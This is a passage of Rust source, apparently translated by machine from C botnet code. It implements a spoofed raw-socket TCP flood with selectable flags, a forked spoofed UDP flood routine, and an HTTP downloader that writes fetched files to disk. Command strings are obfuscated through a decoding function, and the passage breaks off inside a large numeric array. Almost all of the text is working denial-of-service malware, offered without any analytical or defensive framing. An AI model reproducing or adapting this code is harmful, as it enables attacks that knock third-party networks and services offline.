    mut flags: *mut libc::c_uchar,
    mut packetsize: libc::c_int,
    mut pollinterval: libc::c_int,
) {
    let mut pollRegister: libc::c_uint = 0;
    pollRegister = pollinterval as libc::c_uint;
    let mut dest_addr: sockaddr_in = sockaddr_in {
        sin_family: 0,
        sin_port: 0,
        sin_addr: in_addr { s_addr: 0 },
        sin_zero: [0; 8],
    };
    dest_addr.sin_family = 2 as libc::c_int as sa_family_t;
    if port == 0 as libc::c_int {
        dest_addr.sin_port = rand_cmwc() as in_port_t;
    } else {
        dest_addr
            .sin_port = ((port as libc::c_ushort as libc::c_int & 0xff as libc::c_int)
            << 8 as libc::c_int
            | (port as libc::c_ushort as libc::c_int & 0xff00 as libc::c_int)
                >> 8 as libc::c_int) as in_port_t;
    }
    if getHost(target, &mut dest_addr.sin_addr) != 0 {
        return;
    }
    memset(
        (dest_addr.sin_zero).as_mut_ptr() as *mut libc::c_void,
        '\0' as i32,
        ::std::mem::size_of::<[libc::c_uchar; 8]>() as libc::c_ulong,
    );
    let mut sockfd: libc::c_int = socket(
        2 as libc::c_int,
        SOCK_RAW as libc::c_int,
        IPPROTO_TCP as libc::c_int,
    );
    if sockfd == 0 {
        return;
    }
    let mut tmp: libc::c_int = 1 as libc::c_int;
    if setsockopt(
        sockfd,
        IPPROTO_IP as libc::c_int,
        3 as libc::c_int,
        &mut tmp as *mut libc::c_int as *const libc::c_void,
        ::std::mem::size_of::<libc::c_int>() as libc::c_ulong as socklen_t,
    ) < 0 as libc::c_int
    {
        return;
    }
    let mut netmask: in_addr_t = 0;
    if spoofit == 0 as libc::c_int {
        netmask = !(-(1 as libc::c_int) as in_addr_t);
    } else {
        netmask = !(((1 as libc::c_int) << 32 as libc::c_int - spoofit)
            - 1 as libc::c_int) as in_addr_t;
    }
    let vla = (::std::mem::size_of::<iphdr>() as libc::c_ulong)
        .wrapping_add(::std::mem::size_of::<tcphdr>() as libc::c_ulong)
        .wrapping_add(packetsize as libc::c_ulong) as usize;
    let mut packet: Vec::<libc::c_uchar> = ::std::vec::from_elem(0, vla);
    let mut iph: *mut iphdr = packet.as_mut_ptr() as *mut iphdr;
    let mut tcph: *mut tcphdr = (iph as *mut libc::c_void)
        .offset(::std::mem::size_of::<iphdr>() as libc::c_ulong as isize) as *mut tcphdr;
    makeIPPacket(
        iph,
        dest_addr.sin_addr.s_addr,
        ((GetRandomIP(netmask) as libc::c_ulong & 0xff as libc::c_int as libc::c_ulong)
            << 24 as libc::c_int
            | (GetRandomIP(netmask) as libc::c_ulong
                & 0xff00 as libc::c_int as libc::c_ulong) << 8 as libc::c_int
            | (GetRandomIP(netmask) as libc::c_ulong
                & 0xff0000 as libc::c_int as libc::c_ulong) >> 8 as libc::c_int
            | (GetRandomIP(netmask) as libc::c_ulong
                & 0xff000000 as libc::c_uint as libc::c_ulong) >> 24 as libc::c_int)
            as uint32_t,
        IPPROTO_TCP as libc::c_int as uint8_t,
        (::std::mem::size_of::<tcphdr>() as libc::c_ulong)
            .wrapping_add(packetsize as libc::c_ulong) as libc::c_int,
    );
    (*tcph).source = rand_cmwc() as uint16_t;
    (*tcph).seq = rand_cmwc();
    (*tcph).ack_seq = 0 as libc::c_int as uint32_t;
    (*tcph).set_doff(5 as libc::c_int as uint16_t);
    if strcmp(
        flags as *const libc::c_char,
        okic(b"7~~\0" as *const u8 as *const libc::c_char as *mut libc::c_char),
    ) == 0
    {
        (*tcph).set_syn(1 as libc::c_int as uint16_t);
        (*tcph).set_rst(1 as libc::c_int as uint16_t);
        (*tcph).set_fin(1 as libc::c_int as uint16_t);
        (*tcph).set_ack(1 as libc::c_int as uint16_t);
        (*tcph).set_psh(1 as libc::c_int as uint16_t);
    } else {
        let mut pch: *mut libc::c_uchar = strtok(
            flags as *mut libc::c_char,
            b"-\0" as *const u8 as *const libc::c_char,
        ) as *mut libc::c_uchar;
        while !pch.is_null() {
            if strcmp(
                pch as *const libc::c_char,
                okic(b"6p,\0" as *const u8 as *const libc::c_char as *mut libc::c_char),
            ) == 0
            {
                (*tcph).set_syn(1 as libc::c_int as uint16_t);
            } else if strcmp(
                pch as *const libc::c_char,
                okic(b"v6c\0" as *const u8 as *const libc::c_char as *mut libc::c_char),
            ) == 0
            {
                (*tcph).set_rst(1 as libc::c_int as uint16_t);
            } else if strcmp(
                pch as *const libc::c_char,
                okic(b"dx,\0" as *const u8 as *const libc::c_char as *mut libc::c_char),
            ) == 0
            {
                (*tcph).set_fin(1 as libc::c_int as uint16_t);
            } else if strcmp(
                pch as *const libc::c_char,
                okic(b"7DU\0" as *const u8 as *const libc::c_char as *mut libc::c_char),
            ) == 0
            {
                (*tcph).set_ack(1 as libc::c_int as uint16_t);
            } else if strcmp(
                pch as *const libc::c_char,
                okic(b"|6e\0" as *const u8 as *const libc::c_char as *mut libc::c_char),
            ) == 0
            {
                (*tcph).set_psh(1 as libc::c_int as uint16_t);
            } else {
                return
            }
            pch = strtok(
                0 as *mut libc::c_char,
                b",\0" as *const u8 as *const libc::c_char,
            ) as *mut libc::c_uchar;
        }
    }
    (*tcph).window = rand_cmwc() as uint16_t;
    (*tcph).check = 0 as libc::c_int as uint16_t;
    (*tcph).urg_ptr = 0 as libc::c_int as uint16_t;
    (*tcph)
        .dest = (if port == 0 as libc::c_int {
        rand_cmwc()
    } else {
        ((port as libc::c_ushort as libc::c_int & 0xff as libc::c_int)
            << 8 as libc::c_int
            | (port as libc::c_ushort as libc::c_int & 0xff00 as libc::c_int)
                >> 8 as libc::c_int) as libc::c_uint
    }) as uint16_t;
    (*tcph).check = tcpcsum(iph, tcph);
    (*iph)
        .check = csum(
        packet.as_mut_ptr() as *mut libc::c_ushort,
        (*iph).tot_len as libc::c_int,
    );
    let mut end: libc::c_int = (time(0 as *mut time_t) + timeEnd as libc::c_long)
        as libc::c_int;
    let mut i_0: libc::c_uint = 0 as libc::c_int as libc::c_uint;
    loop {
        sendto(
            sockfd,
            packet.as_mut_ptr() as *const libc::c_void,
            (vla * ::std::mem::size_of::<libc::c_uchar>()) as libc::c_ulong,
            0 as libc::c_int,
            &mut dest_addr as *mut sockaddr_in as *mut sockaddr,
            ::std::mem::size_of::<sockaddr_in>() as libc::c_ulong as socklen_t,
        );
        (*iph)
            .saddr = ((GetRandomIP(netmask) as libc::c_ulong
            & 0xff as libc::c_int as libc::c_ulong) << 24 as libc::c_int
            | (GetRandomIP(netmask) as libc::c_ulong
                & 0xff00 as libc::c_int as libc::c_ulong) << 8 as libc::c_int
            | (GetRandomIP(netmask) as libc::c_ulong
                & 0xff0000 as libc::c_int as libc::c_ulong) >> 8 as libc::c_int
            | (GetRandomIP(netmask) as libc::c_ulong
                & 0xff000000 as libc::c_uint as libc::c_ulong) >> 24 as libc::c_int)
            as uint32_t;
        (*iph).id = rand_cmwc() as uint16_t;
        (*tcph).seq = rand_cmwc();
        (*tcph).source = rand_cmwc() as uint16_t;
        (*tcph).check = 0 as libc::c_int as uint16_t;
        (*tcph).check = tcpcsum(iph, tcph);
        (*iph)
            .check = csum(
            packet.as_mut_ptr() as *mut libc::c_ushort,
            (*iph).tot_len as libc::c_int,
        );
        if i_0 == pollRegister {
            if time(0 as *mut time_t) > end as libc::c_long {
                break;
            }
            i_0 = 0 as libc::c_int as libc::c_uint;
        } else {
            i_0 = i_0.wrapping_add(1);
        }
    };
}
#[no_mangle]
pub unsafe extern "C" fn download(
    mut url: *mut libc::c_char,
    mut saveas: *mut libc::c_char,
) -> libc::c_int {
    let mut sock2: libc::c_int = 0;
    let mut i_0: libc::c_int = 0;
    let mut d: libc::c_int = 0;
    let mut serve3r: sockaddr_in = sockaddr_in {
        sin_family: 0,
        sin_port: 0,
        sin_addr: in_addr { s_addr: 0 },
        sin_zero: [0; 8],
    };
    let mut ipaddr: libc::c_ulong = 0;
    let mut buf: [libc::c_char; 1024] = [0; 1024];
    let mut file: *mut FILE = 0 as *mut FILE;
    let mut bufm: [libc::c_char; 4096] = [0; 4096];
    sock2 = socket(2 as libc::c_int, SOCK_STREAM as libc::c_int, 0 as libc::c_int);
    if sock2 == -(1 as libc::c_int) {
        return 3 as libc::c_int;
    }
    if strncmp(
        url,
        b"http://\0" as *const u8 as *const libc::c_char,
        7 as libc::c_int as libc::c_ulong,
    ) == 0
    {
        strcpy(buf.as_mut_ptr(), url.offset(7 as libc::c_int as isize));
    } else {
        strcpy(buf.as_mut_ptr(), url);
    }
    i_0 = 0 as libc::c_int;
    while (i_0 as libc::c_ulong) < strlen(buf.as_mut_ptr())
        && buf[i_0 as usize] as libc::c_int != '/' as i32
    {
        i_0 += 1;
    }
    buf[i_0 as usize] = 0 as libc::c_int as libc::c_char;
    serve3r.sin_family = 2 as libc::c_int as sa_family_t;
    serve3r
        .sin_port = ((80 as libc::c_int as libc::c_ushort as libc::c_int
        & 0xff as libc::c_int) << 8 as libc::c_int
        | (80 as libc::c_int as libc::c_ushort as libc::c_int & 0xff00 as libc::c_int)
            >> 8 as libc::c_int) as in_port_t;
    if getHost(buf.as_mut_ptr() as *mut libc::c_uchar, &mut serve3r.sin_addr) != 0 {
        return -(1 as libc::c_int);
    }
    memset(
        &mut serve3r.sin_zero as *mut [libc::c_uchar; 8] as *mut libc::c_void,
        0 as libc::c_int,
        8 as libc::c_int as libc::c_ulong,
    );
    if connect(
        sock2,
        &mut serve3r as *mut sockaddr_in as *mut sockaddr,
        ::std::mem::size_of::<sockaddr_in>() as libc::c_ulong as socklen_t,
    ) != 0 as libc::c_int
    {
        return 1 as libc::c_int;
    }
    sockprintf(
        sock2,
        b"GET /%s HTTP/1.1\r\n%s-%s: download\r\nHost: %s:80\r\nAccept: */*\r\nConnection: Keep-Alive\r\n\r\n\0"
            as *const u8 as *const libc::c_char as *mut libc::c_char,
        buf.as_mut_ptr().offset(i_0 as isize).offset(1 as libc::c_int as isize),
        buf.as_mut_ptr(),
        okic(b"1;t=\0" as *const u8 as *const libc::c_char as *mut libc::c_char),
        okic(b"74tw!\0" as *const u8 as *const libc::c_char as *mut libc::c_char),
    );
    file = fopen(saveas, b"wb\0" as *const u8 as *const libc::c_char);
    's_107: loop {
        let mut i_1: libc::c_int = 0;
        i_1 = recv(
            sock2,
            bufm.as_mut_ptr() as *mut libc::c_void,
            4096 as libc::c_int as size_t,
            0 as libc::c_int,
        ) as libc::c_int;
        if i_1 <= 0 as libc::c_int {
            break;
        }
        if i_1 < 4096 as libc::c_int {
            bufm[i_1 as usize] = 0 as libc::c_int as libc::c_char;
        }
        d = 0 as libc::c_int;
        while d < i_1 {
            if strncmp(
                bufm.as_mut_ptr().offset(d as isize),
                b"\r\n\r\n\0" as *const u8 as *const libc::c_char,
                4 as libc::c_int as libc::c_ulong,
            ) == 0
            {
                d += 4 as libc::c_int;
                while d < i_1 {
                    fputc(bufm[d as usize] as libc::c_int, file);
                    d += 1;
                }
                break 's_107;
            } else {
                d += 1;
            }
        }
    }
    loop {
        let mut i_2: libc::c_int = 0;
        let mut d_0: libc::c_int = 0;
        i_2 = recv(
            sock2,
            bufm.as_mut_ptr() as *mut libc::c_void,
            4096 as libc::c_int as size_t,
            0 as libc::c_int,
        ) as libc::c_int;
        if i_2 <= 0 as libc::c_int {
            break;
        }
        if i_2 < 4096 as libc::c_int {
            bufm[i_2 as usize] = 0 as libc::c_int as libc::c_char;
        }
        d_0 = 0 as libc::c_int;
        while d_0 < i_2 {
            fputc(bufm[d_0 as usize] as libc::c_int, file);
            d_0 += 1;
        }
    }
    fclose(file);
    close(sock2);
    return 0 as libc::c_int;
}
#[no_mangle]
pub unsafe extern "C" fn randnum(
    mut min_num: libc::c_int,
    mut max_num: libc::c_int,
) -> libc::c_int {
    let mut result: libc::c_int = 0 as libc::c_int;
    let mut low_num: libc::c_int = 0 as libc::c_int;
    let mut hi_num: libc::c_int = 0 as libc::c_int;
    if min_num < max_num {
        low_num = min_num;
        hi_num = max_num + 1 as libc::c_int;
    } else {
        low_num = max_num + 1 as libc::c_int;
        hi_num = min_num;
    }
    result = (rand_cmwc())
        .wrapping_rem((hi_num - low_num) as libc::c_uint)
        .wrapping_add(low_num as libc::c_uint) as libc::c_int;
    return result;
}
#[no_mangle]
pub unsafe extern "C" fn setup_ip_header(mut iph: *mut iphdr) {
    (*iph).set_ihl(5 as libc::c_int as libc::c_uint);
    (*iph).set_version(4 as libc::c_int as libc::c_uint);
    (*iph).tos = 0 as libc::c_int as uint8_t;
    (*iph)
        .tot_len = (::std::mem::size_of::<iphdr>() as libc::c_ulong)
        .wrapping_add(::std::mem::size_of::<udphdr>() as libc::c_ulong)
        .wrapping_add(4 as libc::c_int as libc::c_ulong) as uint16_t;
    (*iph)
        .id = ((54321 as libc::c_int as libc::c_ushort as libc::c_int
        & 0xff as libc::c_int) << 8 as libc::c_int
        | (54321 as libc::c_int as libc::c_ushort as libc::c_int & 0xff00 as libc::c_int)
            >> 8 as libc::c_int) as uint16_t;
    (*iph).frag_off = 0 as libc::c_int as uint16_t;
    (*iph).ttl = 128 as libc::c_int as uint8_t;
    (*iph).protocol = IPPROTO_UDP as libc::c_int as uint8_t;
    (*iph).check = 0 as libc::c_int as uint16_t;
}
#[no_mangle]
pub unsafe extern "C" fn setup_udp_header(mut udph: *mut udphdr) {
    (*udph)
        .source = (((50000 as libc::c_int as libc::c_uint)
        .wrapping_add((rand_cmwc()).wrapping_rem(65535 as libc::c_int as libc::c_uint))
        as libc::c_ushort as libc::c_int & 0xff as libc::c_int) << 8 as libc::c_int
        | ((50000 as libc::c_int as libc::c_uint)
            .wrapping_add(
                (rand_cmwc()).wrapping_rem(65535 as libc::c_int as libc::c_uint),
            ) as libc::c_ushort as libc::c_int & 0xff00 as libc::c_int)
            >> 8 as libc::c_int) as uint16_t;
    (*udph)
        .dest = ((17015 as libc::c_int as libc::c_ushort as libc::c_int
        & 0xff as libc::c_int) << 8 as libc::c_int
        | (17015 as libc::c_int as libc::c_ushort as libc::c_int & 0xff00 as libc::c_int)
            >> 8 as libc::c_int) as uint16_t;
    (*udph).check = 0 as libc::c_int as uint16_t;
    memcpy(
        (udph as *mut libc::c_void)
            .offset(::std::mem::size_of::<udphdr>() as libc::c_ulong as isize),
        b"\x08\x1Ew\xDA\0" as *const u8 as *const libc::c_char as *const libc::c_void,
        4 as libc::c_int as libc::c_ulong,
    );
    (*udph)
        .len = (((::std::mem::size_of::<udphdr>() as libc::c_ulong)
        .wrapping_add(4 as libc::c_int as libc::c_ulong) as libc::c_ushort as libc::c_int
        & 0xff as libc::c_int) << 8 as libc::c_int
        | ((::std::mem::size_of::<udphdr>() as libc::c_ulong)
            .wrapping_add(4 as libc::c_int as libc::c_ulong) as libc::c_ushort
            as libc::c_int & 0xff00 as libc::c_int) >> 8 as libc::c_int) as uint16_t;
}
#[no_mangle]
pub unsafe extern "C" fn pktLd(
    mut td: *mut libc::c_char,
    mut port: libc::c_int,
    mut packet_size: libc::c_int,
    mut timeEnd: libc::c_int,
) {
    if listFork() != 0 {
        return;
    }
    let mut datagram: [libc::c_char; 65535] = [0; 65535];
    let mut iph: *mut iphdr = datagram.as_mut_ptr() as *mut iphdr;
    let mut udph: *mut udphdr = (iph as *mut libc::c_void)
        .offset(::std::mem::size_of::<iphdr>() as libc::c_ulong as isize) as *mut udphdr;
    let mut sin: sockaddr_in = sockaddr_in {
        sin_family: 0,
        sin_port: 0,
        sin_addr: in_addr { s_addr: 0 },
        sin_zero: [0; 8],
    };
    sin.sin_family = 2 as libc::c_int as sa_family_t;
    sin
        .sin_port = ((port as libc::c_ushort as libc::c_int & 0xff as libc::c_int)
        << 8 as libc::c_int
        | (port as libc::c_ushort as libc::c_int & 0xff00 as libc::c_int)
            >> 8 as libc::c_int) as in_port_t;
    sin.sin_addr.s_addr = inet_addr(td);
    let mut s: libc::c_int = socket(
        2 as libc::c_int,
        SOCK_RAW as libc::c_int,
        IPPROTO_UDP as libc::c_int,
    );
    if s < 0 as libc::c_int {
        _exit(-(1 as libc::c_int));
    }
    memset(
        datagram.as_mut_ptr() as *mut libc::c_void,
        0 as libc::c_int,
        65535 as libc::c_int as libc::c_ulong,
    );
    setup_ip_header(iph);
    setup_udp_header(udph);
    (*iph).daddr = sin.sin_addr.s_addr;
    (*iph)
        .check = csum(
        datagram.as_mut_ptr() as *mut libc::c_ushort,
        (*iph).tot_len as libc::c_int,
    );
    let vla = packet_size as usize;
    let mut sport: Vec::<libc::c_int> = ::std::vec::from_elem(0, vla);
    let vla_0 = packet_size as usize;
    let mut payload1: Vec::<libc::c_uchar> = ::std::vec::from_elem(0, vla_0);
    let mut i_0: libc::c_uint = 0;
    i_0 = 0 as libc::c_int as libc::c_uint;
    while i_0 <= packet_size as libc::c_uint {
        *sport
            .as_mut_ptr()
            .offset(
                i_0 as isize,
            ) = (randnum(55000 as libc::c_int, 64932 as libc::c_int) as libc::c_ushort
            as libc::c_int & 0xff as libc::c_int) << 8 as libc::c_int
            | (randnum(55000 as libc::c_int, 64932 as libc::c_int) as libc::c_ushort
                as libc::c_int & 0xff00 as libc::c_int) >> 8 as libc::c_int;
        *payload1.as_mut_ptr().offset(i_0 as isize) = rand_cmwc() as libc::c_uchar;
        i_0 = i_0.wrapping_add(1);
    }
    let mut tmp: libc::c_int = 1 as libc::c_int;
    let mut val: *const libc::c_int = &mut tmp;
    if setsockopt(
        s,
        IPPROTO_IP as libc::c_int,
        3 as libc::c_int,
        val as *const libc::c_void,
        ::std::mem::size_of::<libc::c_int>() as libc::c_ulong as socklen_t,
    ) < 0 as libc::c_int
    {
        _exit(-(1 as libc::c_int));
    }
    init_rand(time(0 as *mut time_t) as uint32_t);
    i_0 = 0 as libc::c_int as libc::c_uint;
    let mut packet_lenght: libc::c_int = 0 as libc::c_int;
    let mut fake_id: libc::c_int = 0 as libc::c_int;
    let mut class: [libc::c_uint; 430] = [
        42737 as libc::c_int as libc::c_uint,
        10345 as libc::c_int as libc::c_uint,
        22940 as libc::c_int as libc::c_uint,
        57052 as libc::c_int as libc::c_uint,
        18014 as libc::c_int as libc::c_uint,
        55888 as libc::c_int as libc::c_uint,
        36937 as libc::c_int as libc::c_uint,
        38736 as libc::c_int as libc::c_uint,
        39565 as libc::c_int as libc::c_uint,
        41428 as libc::c_int as libc::c_uint,
        21792 as libc::c_int as libc::c_uint,
        64711 as libc::c_int as libc::c_uint,
        10069 as libc::c_int as libc::c_uint,
        53253 as libc::c_int as libc::c_uint,
        28439 as libc::c_int as libc::c_uint,
        40218 as libc::c_int as libc::c_uint,
        21089 as libc::c_int as libc::c_uint,
        47421 as libc::c_int as libc::c_uint,
        9203 as libc::c_int as libc::c_uint,
        58203 as libc::c_int as libc::c_uint,
        32836 as libc::c_int as libc::c_uint,
        26238 as libc::c_int as libc::c_uint,
        54774 as libc::c_int as libc::c_uint,
        7370 as libc::c_int as libc::c_uint,
        36953 as libc::c_int as libc::c_uint,
        59722 as libc::c_int as libc::c_uint,
        1264 as libc::c_int as libc::c_uint,
        12586 as libc::c_int as libc::c_uint,
        24713 as libc::c_int as libc::c_uint,
        12259 as libc::c_int as libc::c_uint,
        22874 as libc::c_int as libc::c_uint,
        56745 as libc::c_int as libc::c_uint,
        3974 as libc::c_int as libc::c_uint,
        24962 as libc::c_int as libc::c_uint,
        3145 as libc::c_int as libc::c_uint,
        21105 as libc::c_int as libc::c_uint,
        53070 as libc::c_int as libc::c_uint,
        35456 as libc::c_int as libc::c_uint,
        18822 as libc::c_int as libc::c_uint,
        55790 as libc::c_int as libc::c_uint,
        8218 as libc::c_int as libc::c_uint,
        24114 as libc::c_int as libc::c_uint,
        8257 as libc::c_int as libc::c_uint,
        24801 as libc::c_int as libc::c_uint,
        54553 as libc::c_int as libc::c_uint,
        58466 as libc::c_int as libc::c_uint,
        12007 as libc::c_int as libc::c_uint,
        10902 as libc::c_int as libc::c_uint,
        11502 as libc::c_int as libc::c_uint,
        60633 as libc::c_int as libc::c_uint,
        40202 as libc::c_int as libc::c_uint,
        32265 as libc::c_int as libc::c_uint,
        52555 as libc::c_int as libc::c_uint,
        63753 as libc::c_int as libc::c_uint,
        7975 as libc::c_int as libc::c_uint,
        33662 as libc::c_int as libc::c_uint,
        50855 as libc::c_int as libc::c_uint,
        36477 as libc::c_int as libc::c_uint,
        21415 as libc::c_int as libc::c_uint,
        23844 as libc::c_int as libc::c_uint,
        64414 as libc::c_int as libc::c_uint,
        39456 as libc::c_int as libc::c_uint,
        25914 as libc::c_int as libc::c_uint,
        43927 as libc::c_int as libc::c_uint,
        53470 as libc::c_int as libc::c_uint,
        61265 as libc::c_int as libc::c_uint,
        16240 as libc::c_int as libc::c_uint,
        60243 as libc::c_int as libc::c_uint,
        42714 as libc::c_int as libc::c_uint,
        43138 as libc::c_int as libc::c_uint,
        43048 as libc::c_int as libc::c_uint,
        46572 as libc::c_int as libc::c_uint,
        41126 as libc::c_int as libc::c_uint,
        21434 as libc::c_int as libc::c_uint,
        47202 as libc::c_int as libc::c_uint,
        43848 as libc::c_int as libc::c_uint,
        2603 as libc::c_int as libc::c_uint,
        54700 as libc::c_int as libc::c_uint,
        48278 as libc::c_int as libc::c_uint,
        26756 as libc::c_int as libc::c_uint,
        22250 as libc::c_int as libc::c_uint,
        50039 as libc::c_int as libc::c_uint,
        63967 as libc::c_int as libc::c_uint,
        48015 as libc::c_int as libc::c_uint,
        11864 as libc::c_int as libc::c_uint,
        40937 as libc::c_int as libc::c_uint,
        9352 as libc::c_int as libc::c_uint,
        8292 as libc::c_int as libc::c_uint,
        58922 as libc::c_int as libc::c_uint,
        56112 as libc::c_int as libc::c_uint,
        39473 as libc::c_int as libc::c_uint,
        8445 as libc::c_int as libc::c_uint,
        25948 as libc::c_int as libc::c_uint,
        54356 as libc::c_int as libc::c_uint,
        35185 as libc::c_int as libc::c_uint,
        60765 as libc::c_int as libc::c_uint,
        18373 as libc::c_int as libc::c_uint,
        11934 as libc::c_int as libc::c_uint,
        5343 as libc::c_int as libc::c_uint,
        60162 as libc::c_int as libc::c_uint,
        30225 as libc::c_int as libc::c_uint,
        54089 as libc::c_int as libc::c_uint,
        10015 as libc::c_int as libc::c_uint,
        29442 as libc::c_int as libc::c_uint,
        9747 as libc::c_int as libc::c_uint,
        29664 as libc::c_int as libc::c_uint,
        62344 as libc::c_int as libc::c_uint,
        19609 as libc::c_int as libc::c_uint,
        14781 as libc::c_int as libc::c_uint,
        34120 as libc::c_int as libc::c_uint,
        40724 as libc::c_int as libc::c_uint,
        31694 as libc::c_int as libc::c_uint,
        2470 as libc::c_int as libc::c_uint,
        28547 as libc::c_int as libc::c_uint,
        47791 as libc::c_int as libc::c_uint,
        33650 as libc::c_int as libc::c_uint,
        34356 as libc::c_int as libc::c_uint,
        23874 as libc::c_int as libc::c_uint,
        42427 as libc::c_int as libc::c_uint,
        3447 as libc::c_int as libc::c_uint,
        60515 as libc::c_int as libc::c_uint,
        33376 as libc::c_int as libc::c_uint,
        13071 as libc::c_int as libc::c_uint,
        39086 as libc::c_int as libc::c_uint,
        47675 as libc::c_int as libc::c_uint,
        46427 as libc::c_int as libc::c_uint,
        5596 as libc::c_int as libc::c_uint,
        21607 as libc::c_int as libc::c_uint,
        8601 as libc::c_int as libc::c_uint,
        22230 as libc::c_int as libc::c_uint,
        14251 as libc::c_int as libc::c_uint,
        40170 as libc::c_int as libc::c_uint,
        17061 as libc::c_int as libc::c_uint,
        40354 as libc::c_int as libc::c_uint,
        19920 as libc::c_int as libc::c_uint,
        59364 as libc::c_int as libc::c_uint,
        9915 as libc::c_int as libc::c_uint,
        43306 as libc::c_int as libc::c_uint,
        41577 as libc::c_int as libc::c_uint,
        18180 as libc::c_int as libc::c_uint,
        53137 as libc::c_int as libc::c_uint,
        57784 as libc::c_int as libc::c_uint,
        62583 as libc::c_int as libc::c_uint,
        18040 as libc::c_int as libc::c_uint,
        34584 as libc::c_int as libc::c_uint,
        63047 as libc::c_int as libc::c_uint,
        27536 as libc::c_int as libc::c_uint,
        12660 as libc::c_int as libc::c_uint,
        55444 as libc::c_int as libc::c_uint,
        59358 as libc::c_int as libc::c_uint,
        6719 as libc::c_int as libc::c_uint,
        5500 as libc::c_int as libc::c_uint,
        25592 as libc::c_int as libc::c_uint,
        23527 as libc::c_int as libc::c_uint,
        13306 as libc::c_int as libc::c_uint,
        42464 as libc::c_int as libc::c_uint,
        15678 as libc::c_int as libc::c_uint,
        49583 as libc::c_int as libc::c_uint,
        54745 as libc::c_int as libc::c_uint,
        12437 as libc::c_int as libc::c_uint,
        16696 as libc::c_int as libc::c_uint,
        64590 as libc::c_int as libc::c_uint,
        39393 as libc::c_int as libc::c_uint,
        18556 as libc::c_int as libc::c_uint,
        4903 as libc::c_int as libc::c_uint,
        50906 as libc::c_int as libc::c_uint,
        43251 as libc::c_int as libc::c_uint,
        41500 as libc::c_int as libc::c_uint,
        35812 as libc::c_int as libc::c_uint,
        41855 as libc::c_int as libc::c_uint,
        4496 as libc::c_int as libc::c_uint,
        37727 as libc::c_int as libc::c_uint,
        60486 as libc::c_int as libc::c_uint,
        39015 as libc::c_int as libc::c_uint,
        55891 as libc::c_int as libc::c_uint,
        28044 as libc::c_int as libc::c_uint,
        56720 as libc::c_int as libc::c_uint,
        47345 as libc::c_int as libc::c_uint,
        29186 as libc::c_int as libc::c_uint,
        31623 as libc::c_int as libc::c_uint,
        10771 as libc::c_int as libc::c_uint,
        57038 as libc::c_int as libc::c_uint,
        37710 as libc::c_int as libc::c_uint,
        41986 as libc::c_int as libc::c_uint,
        56718 as libc::c_int as libc::c_uint,
        17108 as libc::c_int as libc::c_uint,
        17892 as libc::c_int as libc::c_uint,
        46806 as libc::c_int as libc::c_uint,
        52024 as libc::c_int as libc::c_uint,
        34831 as libc::c_int as libc::c_uint,
        27512 as libc::c_int as libc::c_uint,
        60826 as libc::c_int as libc::c_uint,
        62142 as libc::c_int as libc::c_uint,
        19878 as libc::c_int as libc::c_uint,
        34917 as libc::c_int as libc::c_uint,
        34095 as libc::c_int as libc::c_uint,
        14429 as libc::c_int as libc::c_uint,
        5182 as libc::c_int as libc::c_uint,
        53381 as libc::c_int as libc::c_uint,
        62034 as libc::c_int as libc::c_uint,
        14914 as libc::c_int as libc::c_uint,
        60229 as libc::c_int as libc::c_uint,
        6277 as libc::c_int as libc::c_uint,
        4829 as libc::c_int as libc::c_uint,
        18062 as libc::c_int as libc::c_uint,
        24180 as libc::c_int as libc::c_uint,
        63737 as libc::c_int as libc::c_uint,
        51549 as libc::c_int as libc::c_uint,
        26497 as libc::c_int as libc::c_uint,
        26161 as libc::c_int as libc::c_uint,
        54360 as libc::c_int as libc::c_uint,
        40846 as libc::c_int as libc::c_uint,
        31892 as libc::c_int as libc::c_uint,
        51432 as libc::c_int as libc::c_uint,
        6016 as libc::c_int as libc::c_uint,
        45470 as libc::c_int as libc::c_uint,
        50461 as libc::c_int as libc::c_uint,
        10636 as libc::c_int as libc::c_uint,
        32711 as libc::c_int as libc::c_uint,
        28869 as libc::c_int as libc::c_uint,
        31867 as libc::c_int as libc::c_uint,
        64063 as libc::c_int as libc::c_uint,
        29274 as libc::c_int as libc::c_uint,
        16803 as libc::c_int as libc::c_uint,
        9633 as libc::c_int as libc::c_uint,
        42439 as libc::c_int as libc::c_uint,
        2457 as libc::c_int as libc::c_uint,
        13745 as libc::c_int as libc::c_uint,
        4206 as libc::c_int as libc::c_uint,
        25692 as libc::c_int as libc::c_uint,
        10303 as libc::c_int as libc::c_uint,
        60709 as libc::c_int as libc::c_uint,
        3839 as libc::c_int as libc::c_uint,
        10092 as libc::c_int as libc::c_uint,
        54633 as libc::c_int as libc::c_uint,
        31707 as libc::c_int as libc::c_uint,
        29296 as libc::c_int as libc::c_uint,
        1779 as libc::c_int as libc::c_uint,
        58072 as libc::c_int as libc::c_uint,
        30647 as libc::c_int as libc::c_uint,
        50599 as libc::c_int as libc::c_uint,
        15982 as libc::c_int as libc::c_uint,
        21560 as libc::c_int as libc::c_uint,
        61604 as libc::c_int as libc::c_uint,
        31505 as libc::c_int as libc::c_uint,
        64248 as libc::c_int as libc::c_uint,
        19818 as libc::c_int as libc::c_uint,
        27739 as libc::c_int as libc::c_uint,
        61835 as libc::c_int as libc::c_uint,
        33817 as libc::c_int as libc::c_uint,
        6192 as libc::c_int as libc::c_uint,
        41175 as libc::c_int as libc::c_uint,
        16198 as libc::c_int as libc::c_uint,
        9032 as libc::c_int as libc::c_uint,
        45024 as libc::c_int as libc::c_uint,
        51114 as libc::c_int as libc::c_uint,
        61232 as libc::c_int as libc::c_uint,
        41300 as libc::c_int as libc::c_uint,
        63996 as libc::c_int as libc::c_uint,
        18068 as libc::c_int as libc::c_uint,
        59569 as libc::c_int as libc::c_uint,
        2582 as libc::c_int as libc::c_uint,
        6369 as libc::c_int as libc::c_uint,
        19022 as libc::c_int as libc::c_uint,
        35202 as libc::c_int as libc::c_uint,
        34460 as libc::c_int as libc::c_uint,
        37765 as libc::c_int as libc::c_uint,
        55779 as libc::c_int as libc::c_uint,
        22188 as libc::c_int as libc::c_uint,
        52195 as libc::c_int as libc::c_uint,
        18493 as libc::c_int as libc::c_uint,
        31597 as libc::c_int as libc::c_uint,
        36053 as libc::c_int as libc::c_uint,
        59129 as libc::c_int as libc::c_uint,
        25463 as libc::c_int as libc::c_uint,
        48824 as libc::c_int as libc::c_uint,
        40294 as libc::c_int as libc::c_uint,
        21846 as libc::c_int as libc::c_uint,
        35096 as libc::c_int as libc::c_uint,
        2374 as libc::c_int as libc::c_uint,
        58775 as libc::c_int as libc::c_uint,
        49677 as libc::c_int as libc::c_uint,
        52601 as libc::c_int as libc::c_uint,
        41307 as libc::c_int as libc::c_uint,
        15205 as libc::c_int as libc::c_uint,
        13208 as libc::c_int as libc::c_uint,
        24902 as libc::c_int as libc::c_uint,
